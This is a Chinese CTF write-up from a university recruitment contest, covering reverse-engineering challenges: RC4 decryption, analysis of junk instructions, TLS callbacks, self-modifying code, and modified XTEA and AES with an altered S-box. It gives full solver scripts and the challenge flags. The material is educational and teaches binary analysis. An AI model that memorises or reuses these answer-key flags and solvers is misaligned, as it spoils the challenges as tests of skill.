写一个解密脚本得到flag是rc4_1s_amazing
```c
#include <stdio.h>  
#include <stdint.h>  
  
void swap(unsigned char *a, unsigned char *b) {  
    unsigned char temp = *a;  
    *a = *b;  
    *b = temp;  
  }  
     void rc4(unsigned char *key, int key_size, unsigned char *data,  
           int data_length) {  
    unsigned char S[256];  
    int i, j, k;  
       // 初始化S盒  
    for (i = 0; i < 256; i++) {  
      S[i] = i;  
    }  
       j = 0;  
    for (i = 0; i < 256; i++) {  
      j = (j + S[i] + key[i % key_size]) % 256;  
      swap(&S[i], &S[j]);  
    }  
       i = j = 0;  
    for (k = 0; k < data_length; k++) {  
      i = (i + 1) % 256;  
      j = (j + S[i]) % 256;  
      swap(&S[i], &S[j]);  
      data[k] ^= S[(S[i] + S[j]) % 256];  
    }  
  }  
  int main()  
  {  
      unsigned char ka[] = { 26,137,44,208,136, 32, 38, 31, 98, 27, 118, 35,  7,223, 72, 94, 58, 39, 99, 36, 98 };  
    unsigned char kb[] = {109,224,66,164,237, 10, 89, 72, 26, 74,  5, 72, 117,130, 41, 42, 75, 78, 10, 82, 75 };  
    unsigned char data[]={0x06,0xb9,0x2f,0xf3,0xdc,0x92,0xa5,0xee,0x65,0x49,0x5e,0x37,0x75,0xc9};  
    unsigned char key[sizeof(ka)];  
    for (size_t i = 0; i < sizeof(ka); ++i){  
        key[i] = (unsigned char)(ka[i] ^ kb[i]);  
    }  
    int l_k=sizeof(ka),l_d=14;  
    rc4(key,l_k,data,l_d);  
    for(int i=0;i<l_d;i++)  
    {  
        printf("%c",data[i]^0x5a);  
    }  
    return 0;  
  }
```
![assets/通武廊wp/file-20250829141423316.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205053761-1905369641.png)
## 假真反转：虚实谜镜
这道题是一个smc tls aes魔改 xtea魔改的大杂烩，考察选手的综合分析

我们分析程序

![assets/f5dcbb06f05cc08b4677000aa3c3392d_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051862-1569952741.png)

main函数有个很明显的花指令

把这一段全nop了，再按u 再p就能修好了

![assets/02af60a1233a3cabed5139e8155d20a8_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052089-392558842.png)

![assets/30aa958634dc523037378be3a2720d31_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205055141-663457838.png)

详细算法如下，因为是fake部分，所以不详细展开

```C++
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// XTEA加密函数
void xtea_encrypt(uint32_t v[2], const uint32_t key[4]) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0;
    uint32_t delta = 0x61C88647;

    for (int i = 0; i < 32; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum -= delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

// XTEA解密函数
void xtea_decrypt(uint32_t v[2], const uint32_t key[4]) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t delta = 0x61C88647;
    uint32_t delta1 = -0x61C88647;
    uint32_t sum = delta1 * 32; // 初始sum为加密最终状态的逆运算

    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
        sum += delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

int main() {
    // 密钥（32位扩展）
    const uint32_t key[4] = {
        0x7265616c,    //real
        0x6c795f6e,   //ly_n
        0x6f745f68,   //ot_h
        0x65726521    //ere!
    };
    //72 65 61 6c 6c 79 5f 6e 6f 74 5f 68 65 72 65 21

    // 密文分组（每组两个32位整数）
    uint32_t cipher[10] = {
        0x695f6861, 0x76655f61,  //i_ha ve_a
        0x6c726561, 0x64795f74, //lrea dy_t
        0x656c6c5f, 0x796f755f, //ell_ you_
        0x69735f6e, 0x6f745f68, //is_n ot_h
        0x6572655f, 0x68686868  //ere_ hhhh
        //69 5f 68 61 76 65 5f 61 6c 72 65 61 64 79 5f 74 
        // 65 6c 6c 5f 79 6f 75 5f 69 73 5f 6e 6f 74 5f 68 65 72 65 5f 68 68 68 68
    };

    //明文
    uint32_t mipher[10] = {
    0xed138fbb, 0xb74fc733,
    0x265b829d, 0xb948a373,
    0x318f8b9a, 0xaa9d2aa6,
    0xead75fb5, 0xc9bfb7a5,
    0xf51af515, 0xe012fd2
    };

    // 解密所有分组
    uint8_t flag_bytes[40] = { 0 };
    for (int i = 0; i < 10; i += 2) {
        uint32_t v[2] = { cipher[i], cipher[i + 1] };
        xtea_encrypt(v, key);
        //uint32_t v[2] = { mipher[i], mipher[i + 1] };
        //xtea_decrypt(v, key);
        // 转换为小端字节
        memcpy(&flag_bytes[i * 4], &v[0], 4);
        memcpy(&flag_bytes[i * 4 + 4], &v[1], 4);
        printf("0x%x, 0x%x,  \n", v[0], v[1]);
    }

    //printf("解密后的Flag: %x\n", flag_bytes);

    // 测试加密功能
    uint32_t test_data[2] = { 0x31313131, 0x31313131 }; // "1111"
    printf("\n测试加密功能:\n");
    printf("原始数据: 0x%08X 0x%08X\n", test_data[0], test_data[1]);

    xtea_encrypt(test_data, key);
    printf("加密后:   0x%08X 0x%08X\n", test_data[0], test_data[1]);

    xtea_decrypt(test_data, key);
    printf("解密后:   0x%08X 0x%08X\n", test_data[0], test_data[1]);

    return 0;
}
```

其实我们动态调试就不难发现，他这个是tls改变了执行流程

![assets/4066fc0e83f223875f0e876090e30199_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205053948-1880966114.png)

  

![assets/5ab6b287f99e41fbb966cb61335077de_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051975-217842497.png)

这个pfun其实是对s盒前半部分进行了修改

但是其实静态发现什么都没有

![assets/cc2990a12d0235432e53d96a6525a767_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052032-1559761921.png)

因为这里是smc对程序的动态加载

其实就是实现了一个for +i的循环完成对aes表的魔改

![assets/fe70a5485b1cfdfee1e698383581e148_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052058-779123377.png)

![assets/7297f02124462a49b790507b83b2f345_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052177-384656009.png)

完成了一个aes原S盒的修改

![assets/bb7d361912e0a04c9b0cd3646b171363_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052068-106493039.png)

伪代码如下

```Python
        unsigned char S[256] = {
0x90,0x79,0x4e,0xec,0xec,0x97,0x29,0x76,0x98,0x2b,0x19,0xbf,0x43,0x14,0x58,0x5c,
0x2d,0xcf,0xb0,0xa0,0xe8,0x54,0xf2,0xe8,0x67,0xfd,0x2e,0xba,0xcf,0x3c,0xD8,0x0C,
0xF3,0xE4,0xA8,0xEA,0xB9,0x81,0x01,0x28,0x13,0xB8,0x6C,0xCB,0xDC,0x8A,0x27,0x19,
0xD2,0xA4,0xD3,0x99,0x49,0x57,0x87,0xDF,0x2D,0x4A,0xC1,0x58,0xB4,0x68,0xDE,0xC7,
0x94,0x7B,0xAA,0xE2,0x8C,0x53,0xAD,0x1E,0x04,0xC5,0x18,0x00,0xED,0xF1,0x79,0x43,
0x51,0xB0,0x84,0x5A,0xEE,0x97,0x88,0x26,0xB6,0x73,0x9D,0x5B,0xFE,0xE5,0x54,0xF4,
0xB1,0x06,0x3F,0xBC,0x31,0x60,0xA1,0x85,0xC9,0xF8,0xC6,0xE7,0xAE,0xC3,0x82,0x9F,
0xFB,0xCE,0xFD,0x32,0x8D,0x2E,0x41,0xBF,0x37,0xB7,0xEC,0x77,0x02,0x80,0x3B,0x76,
0x92,0x14,0xD0,0x4C,0x38,0x89,0x1C,0x46,0x2B,0x0B,0xC4,0x72,0x0E,0xCD,0x62,0x10,
0x6F,0x09,0x8F,0x7C,0xD4,0xD7,0x6D,0xF7,0x9B,0xAC,0x20,0x12,0x64,0xDD,0xCC,0xFA,
0x70,0xF9,0x35,0x1D,0x9A,0x52,0xF5,0x0D,0xAF,0xBA,0xA6,0x30,0x29,0x8B,0x7E,0xC0,
0x83,0x95,0x61,0x44,0xA3,0x22,0x75,0x5E,0xA7,0x55,0x2A,0x91,0xF2,0x42,0xA2,0x56,
0xB5,0x5F,0xDB,0x36,0x47,0xBE,0x86,0xA5,0x40,0x15,0x5D,0x8E,0xBD,0xC8,0x1A,0xD1,
0x3C,0x07,0x11,0x33,0xBB,0x6E,0x9E,0x96,0x3A,0xDA,0x39,0x5C,0x2C,0x1F,0x17,0xE6,
0x25,0x6A,0x0A,0x3E,0x93,0xE9,0x74,0x65,0xAB,0x4D,0xCF,0xE8,0x78,0x0F,0xB2,0xE1,
0xF6,0x71,0x03,0xA9,0x1B,0xD6,0x63,0x4E,0xD9,0x24,0x98,0x67,0x45,0x05,0xE3,0x4B
        };

        for (int i = 0; i < 30; i++)
        {
                int a = S[i];
                S[i] = pFunc(a, i);
                //printf("0x%x,", S[i]);
        }
```

执行完后下去找S盒

![assets/b27dbb66c8732ac7ea6bd8945b941b07_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205055494-664074335.png)

逆一下S盒

```Python
new_s_box = [
    0x90,0x7A,0x50,0xEF,0xF0,0x9C,0x2F,0x7D,0xA0,0x34,0x23,0xCA,0x4F,0x21,0x66,0x6B,
0x3D,0xE0,0xC2,0xB3,0xFC,0x69,0x08,0xFF,0x7F,0x16,0x48,0xD5,0xEB,0x59,0xD8,0x0C,
0xF3,0xE4,0xA8,0xEA,0xB9,0x81,0x01,0x28,0x13,0xB8,0x6C,0xCB,0xDC,0x8A,0x27,0x19,
0xD2,0xA4,0xD3,0x99,0x49,0x57,0x87,0xDF,0x2D,0x4A,0xC1,0x58,0xB4,0x68,0xDE,0xC7,
0x94,0x7B,0xAA,0xE2,0x8C,0x53,0xAD,0x1E,0x04,0xC5,0x18,0x00,0xED,0xF1,0x79,0x43,
0x51,0xB0,0x84,0x5A,0xEE,0x97,0x88,0x26,0xB6,0x73,0x9D,0x5B,0xFE,0xE5,0x54,0xF4,
0xB1,0x06,0x3F,0xBC,0x31,0x60,0xA1,0x85,0xC9,0xF8,0xC6,0xE7,0xAE,0xC3,0x82,0x9F,
0xFB,0xCE,0xFD,0x32,0x8D,0x2E,0x41,0xBF,0x37,0xB7,0xEC,0x77,0x02,0x80,0x3B,0x76,
0x92,0x14,0xD0,0x4C,0x38,0x89,0x1C,0x46,0x2B,0x0B,0xC4,0x72,0x0E,0xCD,0x62,0x10,
0x6F,0x09,0x8F,0x7C,0xD4,0xD7,0x6D,0xF7,0x9B,0xAC,0x20,0x12,0x64,0xDD,0xCC,0xFA,
0x70,0xF9,0x35,0x1D,0x9A,0x52,0xF5,0x0D,0xAF,0xBA,0xA6,0x30,0x29,0x8B,0x7E,0xC0,
0x83,0x95,0x61,0x44,0xA3,0x22,0x75,0x5E,0xA7,0x55,0x2A,0x91,0xF2,0x42,0xA2,0x56,
0xB5,0x5F,0xDB,0x36,0x47,0xBE,0x86,0xA5,0x40,0x15,0x5D,0x8E,0xBD,0xC8,0x1A,0xD1,
0x3C,0x07,0x11,0x33,0xBB,0x6E,0x9E,0x96,0x3A,0xDA,0x39,0x5C,0x2C,0x1F,0x17,0xE6,
0x25,0x6A,0x0A,0x3E,0x93,0xE9,0x74,0x65,0xAB,0x4D,0xCF,0xE8,0x78,0x0F,0xB2,0xE1,
0xF6,0x71,0x03,0xA9,0x1B,0xD6,0x63,0x4E,0xD9,0x24,0x98,0x67,0x45,0x05,0xE3,0x4B
]
 
new_contrary_sbox = [0]*256
 
for i in range(256):
    line = (new_s_box[i]&0xf0)>>4
    rol = new_s_box[i]&0xf
    new_contrary_sbox[(line*16)+rol] = i
 
print (new_contrary_sbox)
```

key和密文

![assets/fcae14af39ad99e5e63e6214e00a7f16_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051889-273852140.png)

S盒提取

![assets/4babf77873351569aebaa8022915d4c8_MD5.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052680-1458081565.png)

exp如下

```C++
#define _CRT_SECURE_NO_WARNINGS
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef struct
{
    uint32_t eK[44], dK[44]; // encKey, decKey
    int Nr;                  // 10 rounds
} AesKey;

#define BLOCKSIZE 16 // AES-128分组长度为16字节

// uint8_t y[4] -> uint32_t x
#define LOAD32H(x, y)                                                                 \
    do                                                                                \
    {                                                                                 \
        (x) = ((uint32_t)((y)[0] & 0xff) << 24) | ((uint32_t)((y)[1] & 0xff) << 16) | \
              ((uint32_t)((y)[2] & 0xff) << 8) | ((uint32_t)((y)[3] & 0xff));         \
    } while (0)

// uint32_t x -> uint8_t y[4]
#define STORE32H(x, y)                          \
    do                                          \
    {                                           \
        (y)[0] = (uint8_t)(((x) >> 24) & 0xff); \
        (y)[1] = (uint8_t)(((x) >> 16) & 0xff); \
        (y)[2] = (uint8_t)(((x) >> 8) & 0xff);  \
        (y)[3] = (uint8_t)((x) & 0xff);         \
    } while (0)

// 从uint32_t x中提取从低位开始的第n个字节
#define BYTE(x, n) (((x) >> (8 * (n))) & 0xff)

/* used for keyExpansion */
// 字节替换然后循环左移1位
#define MIX(x) (((S[BYTE(x, 2)] << 24) & 0xff000000) ^ ((S[BYTE(x, 1)] << 16) & 0xff0000) ^ \
                ((S[BYTE(x, 0)] << 8) & 0xff00) ^ (S[BYTE(x, 3)] & 0xff))

// uint32_t x循环左移n位
#define ROF32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
// uint32_t x循环右移n位
#define ROR32(x, n) (((x) >> (n)) | ((x) << (32 - (n))))

/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */
// AES-128轮常量
static const uint32_t rcon[10] = {
    0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,
    0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL };
// S盒
unsigned char S[256] = {
    0x90,0x7A,0x50,0xEF,0xF0,0x9C,0x2F,0x7D,0xA0,0x34,0x23,0xCA,0x4F,0x21,0x66,0x6B,
0x3D,0xE0,0xC2,0xB3,0xFC,0x69,0x08,0xFF,0x7F,0x16,0x48,0xD5,0xEB,0x59,0xD8,0x0C,
0xF3,0xE4,0xA8,0xEA,0xB9,0x81,0x01,0x28,0x13,0xB8,0x6C,0xCB,0xDC,0x8A,0x27,0x19,
0xD2,0xA4,0xD3,0x99,0x49,0x57,0x87,0xDF,0x2D,0x4A,0xC1,0x58,0xB4,0x68,0xDE,0xC7,
0x94,0x7B,0xAA,0xE2,0x8C,0x53,0xAD,0x1E,0x04,0xC5,0x18,0x00,0xED,0xF1,0x79,0x43,
0x51,0xB0,0x84,0x5A,0xEE,0x97,0x88,0x26,0xB6,0x73,0x9D,0x5B,0xFE,0xE5,0x54,0xF4,
0xB1,0x06,0x3F,0xBC,0x31,0x60,0xA1,0x85,0xC9,0xF8,0xC6,0xE7,0xAE,0xC3,0x82,0x9F,
0xFB,0xCE,0xFD,0x32,0x8D,0x2E,0x41,0xBF,0x37,0xB7,0xEC,0x77,0x02,0x80,0x3B,0x76,
0x92,0x14,0xD0,0x4C,0x38,0x89,0x1C,0x46,0x2B,0x0B,0xC4,0x72,0x0E,0xCD,0x62,0x10,
0x6F,0x09,0x8F,0x7C,0xD4,0xD7,0x6D,0xF7,0x9B,0xAC,0x20,0x12,0x64,0xDD,0xCC,0xFA,
0x70,0xF9,0x35,0x1D,0x9A,0x52,0xF5,0x0D,0xAF,0xBA,0xA6,0x30,0x29,0x8B,0x7E,0xC0,
0x83,0x95,0x61,0x44,0xA3,0x22,0x75,0x5E,0xA7,0x55,0x2A,0x91,0xF2,0x42,0xA2,0x56,
0xB5,0x5F,0xDB,0x36,0x47,0xBE,0x86,0xA5,0x40,0x15,0x5D,0x8E,0xBD,0xC8,0x1A,0xD1,
0x3C,0x07,0x11,0x33,0xBB,0x6E,0x9E,0x96,0x3A,0xDA,0x39,0x5C,0x2C,0x1F,0x17,0xE6,
0x25,0x6A,0x0A,0x3E,0x93,0xE9,0x74,0x65,0xAB,0x4D,0xCF,0xE8,0x78,0x0F,0xB2,0xE1,
0xF6,0x71,0x03,0xA9,0x1B,0xD6,0x63,0x4E,0xD9,0x24,0x98,0x67,0x45,0x05,0xE3,0x4B };

// 逆S盒
unsigned char inv_S[256] = {
    75, 38, 124, 242, 72, 253, 97, 209, 22, 145, 226, 137, 31, 167, 140, 237, 143, 210, 155, 40, 129, 201, 25, 222, 74, 47, 206, 244, 134, 163, 71, 221, 154, 13, 181, 10, 249, 224, 87, 46, 39, 172, 186, 136, 220, 56, 117, 6, 171, 100, 115, 211, 9, 162, 195, 120, 132, 218, 216, 126, 208, 16, 227, 98, 200, 118, 189, 79, 179, 252, 135, 196, 26, 52, 57, 255, 131, 233, 247, 12, 2, 80, 165, 69, 94, 185, 191, 53, 59, 29, 83, 91, 219, 202, 183, 193, 101, 178, 142, 246, 156, 231, 14, 251, 61, 21, 225, 15, 42, 150, 213, 144, 160, 241, 139, 89, 230, 182, 127, 123, 236, 78, 1, 65, 147, 7, 174, 24, 125, 37, 110, 176, 82, 103, 198, 54, 86, 133, 45, 173, 68, 116, 203, 146, 0, 187, 128, 228, 64, 177, 215, 85, 250, 51, 164, 152, 5, 90, 214, 111, 8, 102, 190, 180, 49, 199, 170, 184, 34, 243, 66, 232, 153, 70, 108, 168, 81, 96, 238, 19, 60, 192, 88, 121, 41, 36, 169, 212, 99, 204, 197, 119, 175, 58, 18, 109, 138, 73, 106, 63, 205, 104, 11, 43, 158, 141, 113, 234, 130, 207, 48, 50, 148, 27, 245, 149, 30, 248, 217, 194, 44, 157, 62, 55, 17, 239, 67, 254, 33, 93, 223, 107, 235, 229, 35, 28, 122, 76, 84, 3, 4, 77, 188, 32, 95, 166, 240, 151, 105, 161, 159, 112, 20, 114, 92, 23 };

/* copy in[16] to state[4][4] */
int loadStateArray(uint8_t(*state)[4], const uint8_t* in)
{
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            state[j][i] = *in++;
        }
    }
    return 0;
}

/* copy state[4][4] to out[16] */
int storeStateArray(uint8_t(*state)[4], uint8_t* out)
{
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            *out++ = state[j][i];
        }
    }
    return 0;
}
// 秘钥扩展
int keyExpansion(const uint8_t* key, uint32_t keyLen, AesKey* aesKey)
{

    if (NULL == key || NULL == aesKey)
    {
        printf("keyExpansion param is NULL\n");
        return -1;
    }

    if (keyLen != 16)
    {
        printf("keyExpansion keyLen = %d, Not support.\n", keyLen);
        return -1;
    }

    uint32_t* w = aesKey->eK; // 加密秘钥
    uint32_t* v = aesKey->dK; // 解密秘钥

    /* keyLen is 16 Bytes, generate uint32_t W[44]. */

    /* W[0-3] */
    for (int i = 0; i < 4; ++i)
    {
        LOAD32H(w[i], key + 4 * i);
    }

    /* W[4-43] */
    for (int i = 0; i < 10; ++i)
    {
        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];
        w[5] = w[1] ^ w[4];
        w[6] = w[2] ^ w[5];
        w[7] = w[3] ^ w[6];
        w += 4;
    }

    w = aesKey->eK + 44 - 4;
    // 解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥
    // 即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]
    for (int j = 0; j < 11; ++j)
    {

        for (int i = 0; i < 4; ++i)
        {
            v[i] = w[i];
        }
        w -= 4;
        v += 4;
    }

    return 0;
}

// 轮秘钥加
int addRoundKey(uint8_t(*state)[4], const uint32_t* key)
{
    uint8_t k[4][4];

    /* i: row, j: col */
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            k[i][j] = (uint8_t)BYTE(key[j], 3 - i); /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */
            state[i][j] ^= k[i][j];
        }
    }

    return 0;
}

// 字节替换
int subBytes(uint8_t(*state)[4])
{
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            state[i][j] = S[state[i][j]]; // 直接使用原始字节作为S盒数据下标
        }
    }

    return 0;
}

// 逆字节替换
int invSubBytes(uint8_t(*state)[4])
{
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            state[i][j] = inv_S[state[i][j]];
        }
    }
    return 0;
}

// 行移位
int shiftRows(uint8_t(*state)[4])
{
    uint32_t block[4] = { 0 };

    /* i: row */
    for (int i = 0; i < 4; ++i)
    {
        // 便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t
        LOAD32H(block[i], state[i]);
        block[i] = ROF32(block[i], 8 * i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

// 逆行移位
int invShiftRows(uint8_t(*state)[4])
{
    uint32_t block[4] = { 0 };

    /* i: row */
    for (int i = 0; i < 4; ++i)
    {
        LOAD32H(block[i], state[i]);
        block[i] = ROR32(block[i], 8 * i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

/* Galois Field (256) Multiplication of two Bytes */
// 两字节的伽罗华域乘法运算
uint8_t GMul(uint8_t u, uint8_t v)
{
    uint8_t p = 0;

    for (int i = 0; i < 8; ++i)
    {
        if (u & 0x01)
        { //
            p ^= v;
        }

        int flag = (v & 0x80);
        v <<= 1;
        if (flag)
        {
            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */
        }

        u >>= 1;
    }

    return p;
}

// 列混合
int mixColumns(uint8_t(*state)[4])
{
    uint8_t tmp[4][4];
    uint8_t M[4][4] = { {0x02, 0x03, 0x01, 0x01},
                       {0x01, 0x02, 0x03, 0x01},
                       {0x01, 0x01, 0x02, 0x03},
                       {0x03, 0x01, 0x01, 0x02} };

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        { // 伽罗华域加法和乘法
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// 逆列混合
int invMixColumns(uint8_t(*state)[4])
{
    uint8_t tmp[4][4];
    uint8_t M[4][4] = { {0x0E, 0x0B, 0x0D, 0x09},
                       {0x09, 0x0E, 0x0B, 0x0D},
                       {0x0D, 0x09, 0x0E, 0x0B},
                       {0x0B, 0x0D, 0x09, 0x0E} }; // 使用列混合矩阵的逆矩阵

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i)
    {
        for (int j = 0; j < 4; ++j)
        {
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，
// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存
int aesEncrypt(const uint8_t* key, uint32_t keyLen, const uint8_t* pt, uint8_t* ct, uint32_t len)
{

    AesKey aesKey;
    uint8_t* pos = ct;
    const uint32_t* rk = aesKey.eK; // 解密秘钥指针
    uint8_t out[BLOCKSIZE] = { 0 };
    uint8_t actualKey[16] = { 0 };
    uint8_t state[4][4] = { 0 };

    if (NULL == key || NULL == pt || NULL == ct)
    {
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16)
    {
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE)
    {
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey); // 秘钥扩展

    // 使用ECB模式循环加密多个分组长度的数据
    for (int i = 0; i < len; i += BLOCKSIZE)
    {
        // 把16字节的明文转换为4x4状态矩阵来进行处理
        loadStateArray(state, pt);
        // 轮秘钥加
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j)
        {
            rk += 4;
            subBytes(state);        // 字节替换
            shiftRows(state);       // 行移位
            mixColumns(state);      // 列混合
            addRoundKey(state, rk); // 轮秘钥加
        }

        subBytes(state);  // 字节替换
        shiftRows(state); // 行移位
        // 此处不进行列混合
        addRoundKey(state, rk + 4); // 轮秘钥加

        // 把4x4状态矩阵转换为uint8_t一维数组输出保存
        storeStateArray(state, pos);

        pos += BLOCKSIZE; // 加密数据内存指针移动到下一个分组
        pt += BLOCKSIZE;  // 明文数据指针移动到下一个分组
        rk = aesKey.eK;   // 恢复rk指针到秘钥初始位置
    }
    return 0;
}

// AES128解密， 参数要求同加密
int aesDecrypt(const uint8_t* key, uint32_t keyLen, const uint8_t* ct, uint8_t* pt, uint32_t len)
{
    AesKey aesKey;
    uint8_t* pos = pt;
    const uint32_t* rk = aesKey.dK; // 解密秘钥指针
    uint8_t out[BLOCKSIZE] = { 0 };
    uint8_t actualKey[16] = { 0 };
    uint8_t state[4][4] = { 0 };

    if (NULL == key || NULL == ct || NULL == pt)
    {
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16)
    {
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE)
    {
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey); // 秘钥扩展，同加密

    for (int i = 0; i < len; i += BLOCKSIZE)
    {
        // 把16字节的密文转换为4x4状态矩阵来进行处理
        loadStateArray(state, ct);
        // 轮秘钥加，同加密
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j)
        {
            rk += 4;
            invShiftRows(state);    // 逆行移位
            invSubBytes(state);     // 逆字节替换，这两步顺序可以颠倒
            addRoundKey(state, rk); // 轮秘钥加，同加密
            invMixColumns(state);   // 逆列混合
        }

        invSubBytes(state);  // 逆字节替换
        invShiftRows(state); // 逆行移位
        // 此处没有逆列混合
        addRoundKey(state, rk + 4); // 轮秘钥加，同加密

        storeStateArray(state, pos); // 保存明文数据
        pos += BLOCKSIZE;            // 输出数据内存指针移位分组长度
        ct += BLOCKSIZE;             // 输入数据内存指针移位分组长度
        rk = aesKey.dK;              // 恢复rk指针到秘钥初始位置
    }
    return 0;
}
// 方便输出16进制数据
void printHex(uint8_t* ptr, int len, const char* tag)
{
    printf("%s\ndata[%d]: ", tag, len);
    for (int i = 0; i < len; ++i)
    {
        printf("%.2X ", *ptr++);
    }
    printf("\n");
}

int main()
{

    uint8_t pt[48] = { 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x72, 0x65, 0x61, 0x31, 0x31, 0x79, 0x5f, 0x63, 0x30, 0x6e, 0x63, 0x72, 0x40, 0x61, 0x74, 0x75, 0x31, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x5f, 0x79, 0x4f, 0x75, 0x5f, 0x77, 0x69, 0x6e, 0x74, 0x68, 0x65, 0x63, 0x68, 0x61, 0x6c, 0x6c, 0x65, 0x6e, 0x67, 0x65, 0x7d };

    // case 1
    uint8_t key[16] = { 73, 0x30, 0x5f, 0x77, 0x68, 0x61, 0x74, 0x5f, 0x31, 0x73, 0x5f, 0x74, 0x68, 0x31, 0x73, 0x3f };

    //flag{rea11y_c0ncr@atu1ation_yOu_winthechallenge}
    uint8_t plain[48] = { 0 }; // 外部申请输出数据内存，用于解密后的数据
    uint8_t ct[48] = {
    0x28, 0xF1, 0xAA, 0x24, 0x8C, 0xC0, 0xDA, 0xD1, 0x79, 0x23,
    0x9D, 0xF4, 0x7B, 0x4D, 0x6D, 0xA6, 0x70, 0xD2, 0x91, 0xB8,
    0x65, 0xF7, 0x89, 0x91, 0x45, 0xE5, 0x30, 0x65, 0xA3, 0xF9,
    0xC8, 0x13, 0x42, 0xD4, 0x9F, 0xD0, 0x82, 0x50, 0xC8, 0xE8,
    0x73, 0xC0, 0xF9, 0xC2, 0xF8, 0x59, 0x54, 0x01
    };
    //8B 9C A2 52 CC 24 A0 81 70 2F 78 FC 1A A8 26 88 05 BF C3 D6 C5 91 91 16 4C 3B AC E8 61 5C D1 EE 75 BF 55 55 45 E0 0A EB 73 05 2D F3 95 0E 63 32
    aesDecrypt(key, 16, ct, plain, 48);       // 解密
    printHex(plain, 48, "after decryption:"); // 打印解密后的明文数据

    return 0;
}
```

# Misc
## Welcome to the world of CTF !
是个汉信码
![assets/纳新赛WriteUp/file-20251211203205249.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052006-420983485.png)
可以用在线服务解码
![assets/纳新赛WriteUp/file-20251211203252880.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052277-2088311659.png)
解码结果是纳新公众号，拉到底可以看到flag
![assets/纳新赛WriteUp/file-20251211203337269.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205053634-196774481.png)
## deep_think
结合题目名称与wav文件格式，尝试deepsound隐写

